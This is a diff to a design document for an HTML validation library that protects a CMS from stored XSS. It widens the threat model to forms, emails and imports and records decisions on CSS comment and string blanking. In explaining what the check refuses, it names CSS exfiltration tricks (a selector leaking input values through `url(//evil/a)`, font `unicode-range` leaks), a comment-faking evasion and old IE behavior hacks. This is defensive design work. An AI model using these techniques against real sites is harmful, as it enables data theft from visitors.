@@ -28,11 +28,21 @@ Contents:
 
 ## Threat Model
 
-**Who submits the content:** staff with an account on the CMS, through a WYSIWYG editor, an
-HTML field, the editor's source view, or the API. Not anonymous visitors.
+**Where the content comes from:** anywhere a string can reach a stored HTML field: a form a
+visitor filled in, an incoming email, an import, a feed or a supplier's data, a plugin's own
+query, a restored backup, an API call, and staff through the editor, its source view or an
+HTML field. The check runs on the string and does not know which. A visitor's form and an
+email are where hostile input most often arrives; a trusted staff member pasting a payload is
+the least likely case, though a staff account writes to every page.
+
+**Where it is called:** at the save, to refuse the content with a reason, and on stored
+content before an editor or a page shows it. The second call is the one that matters for the
+paths above, since most of them never pass through a save handler. The CMS's job is to warn
+above the field in the editor and withhold the content from the page.
 
 **Where it is printed:** into the body of a page in the site's own origin, as HTML, by a
-template the site controls. The template may run its own scripts on the same page.
+template the site controls: a public page, or the admin page where staff read what a form or
+an email brought in. The template may run its own scripts on the same page.
 
 **What an attacker gains:** script in the site's origin, running for every visitor and every
 staff member who views the page, with their session. That is the whole attack class the
@@ -40,8 +50,8 @@ library exists to stop: stored XSS through a rich-text field.
 
 **What the attacker controls:** the bytes of the field, entirely. They can write anything
 the editor lets through (nearly everything, see [The Editor Is Not a
-Layer](#the-editor-is-not-a-layer)), and they can bypass the editor through source view, an
-HTML textbox, or the API.
+Layer](#the-editor-is-not-a-layer)), they can bypass the editor through source view, an
+HTML textbox, or the API, and a form post or an email never passes through an editor at all.
 
 **The rule that follows:** the check must refuse every token that runs script in a current
 browser, and every construct where an HTML parser could read the bytes differently from the
@@ -57,7 +67,7 @@ guess.
 ## Known Non-Goals
 
 Each of these was considered and left out on purpose. Every one is a real thing a hostile
-staff member could do; none of them is script.
+author could do; none of them is script.
 
 - **Phishing overlays.** `position: fixed`, `z-index`, a full-page `<div>` and, when the
   forms switch is on, a fake login form. Forms are off by default for this reason; CSS
@@ -86,8 +96,10 @@ staff member could do; none of them is script.
 The library reports what is wrong and leaves the content alone, unlike HTMLPurifier, DOMPurify
 and every other HTML sanitizer.
 
-1. The person who submitted the content can fix it. They are staff, they have the editor
-   open, and the message quotes the tag.
+1. The person who submitted the content can fix it: they are staff, they have the editor
+   open, and the message quotes the tag. When nobody can (an import, an email), the reject
+   means the content is withheld and the message says why, instead of a trimmed version
+   nobody reviewed going out.
 2. A sanitizer rewrites everything it touches: closes tags, normalizes entities, drops every
    element it has no definition for. HTMLPurifier drops every HTML5 element (`section`,
    `figure`, `video`) for that reason. Content that comes back different from what was saved
@@ -100,8 +112,8 @@ it re-emits encoded). A validator has no such net, so it must refuse every const
 parsers disagree. That is why the state-switching elements are refused and why the tokenizer
 follows the spec.
 
-The mirror image holds for public visitor content (forum posts, comments): the author
-cannot be asked to fix their HTML, so filter it and show what survived. Not this library's
+The mirror image holds for visitor content that gets published as HTML (forum posts,
+comments): the author cannot be asked to fix their HTML, so filter it and show what survived. Not this library's
 job; the CMS keeps a sanitizer for that audience.
 
 ## Tokens, Not Trees
@@ -219,12 +231,25 @@ url(//evil/a) }` leaks an input's value one character per request, and `@font-fa
 `unicode-range` leaks which characters the page shows. Every current browser does this. A
 `style` attribute cannot (no selectors), but the check is one regex so it runs on both.
 Exact-match selectors, web fonts without `unicode-range`, and external images in the element
-stay allowed. Comments are not stripped first: `content: "/*"` inside a string can fake a
-comment opener and hide a token after it.
+stay allowed.
 
-Rejected: a CSS tokenizer (MediaWiki runs one; the backslash ban makes it unnecessary), and
-refusing `position: fixed` and `z-index` (a phishing overlay, not script, and in every email
-template).
+Comments and quoted strings are blanked before the regex runs (settled 2026-09-20). The
+corpus made the case: email templates draw comment banners with backslashes, and Word
+pastes quote font names like `'\@Yu Mincho'`, so the plain backslash ban refused ordinary
+content. Blanking reads left to right as a CSS tokenizer does, so `content: "/*"` cannot
+fake a comment opener: the quote comes first and the string ends at its closing quote. Two
+things stay on the text as written: the `url()` scheme check, since the target is usually
+quoted, and a backslash inside a quoted `url()` argument, since an escape there still
+spells a scheme. Past the PCRE limits (megabytes inside one comment or string) blanking is
+skipped and the text is checked as written, which is stricter.
+
+Also settled 2026-09-20: `behavior:` matches only as a property name, so `scroll-behavior`
+and `overscroll-behavior` pass. The `*behavior` and `_behavior` hacks old IE read still
+reject.
+
+Rejected: a full CSS tokenizer (MediaWiki runs one; the backslash ban plus blanking makes it
+unnecessary), and refusing `position: fixed` and `z-index` (a phishing overlay, not script,
+and in every email template).
 
 ## `<style>` Is Allowed
 
